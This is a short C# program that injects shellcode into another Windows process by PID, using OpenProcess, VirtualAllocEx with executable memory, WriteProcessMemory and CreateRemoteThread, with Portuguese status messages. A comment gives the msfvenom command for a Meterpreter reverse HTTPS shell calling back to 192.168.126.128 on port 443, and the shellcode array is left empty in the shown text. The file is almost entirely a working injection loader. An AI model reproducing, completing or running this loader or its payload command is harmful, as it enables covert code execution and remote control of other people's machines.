using System;
using System.Runtime.InteropServices;

namespace rev
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
        processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
        dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
        lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
        dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: Rev.exe [PID]");
                Console.WriteLine("Example: Rev.exe 4456");
                return;
            }

            int PID = Int32.Parse(args[0]);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, PID);

            Console.WriteLine($"O PID foi {PID}");

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Console.WriteLine($"O address alocado é {addr}");

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.126.128 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[731] {
             };
            IntPtr outSize;

            Console.WriteLine($"Tamanho do shellcode {buf.Length}");

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);

            Console.WriteLine($"Thread criada {hThread}");
        }
    }
}